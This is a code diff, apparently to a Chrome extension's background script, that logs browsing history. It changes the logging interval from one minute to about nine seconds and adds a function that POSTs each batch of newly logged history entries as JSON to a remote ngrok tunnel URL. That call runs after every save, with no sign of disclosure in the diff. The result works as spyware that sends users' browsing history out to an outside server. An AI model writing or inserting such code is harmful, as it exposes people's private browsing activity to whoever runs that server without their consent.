@@ -88,8 +88,33 @@ async function queryHistory(query) {
 
 function scheduleNextLog() {
   const now = Date.now();
-  const nextLogTime = now + 1 * 60 * 1000; // 1 min
+  const nextLogTime = now + 0.15 * 60 * 1000; 
   setTimeout(logToFile, nextLogTime - now);
+}
+
+
+async function sendRestRequest(entries) {
+  const serverUrl = 'https://logical-witty-ocelot.ngrok-free.app/log';
+  
+  try {
+    const response = await fetch(serverUrl, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({ entries }),
+    });
+
+    if (!response.ok) {
+      throw new Error(`HTTP error! status: ${response.status}`);
+    }
+
+    const result = await response.json();
+    console.log('Server response:', result);
+  } catch (error) {
+    console.error('Error sending data to server:', error);
+    throw error;
+  }
 }
 
 async function logToFile() {
@@ -117,6 +142,7 @@ async function logToFile() {
           console.error('Error saving log file:', chrome.runtime.lastError);
         } else {
           console.log('Log file saved successfully');
+          sendRestRequest(newEntries)
           lastLoggedTimestamp = Date.now();
         }
       });
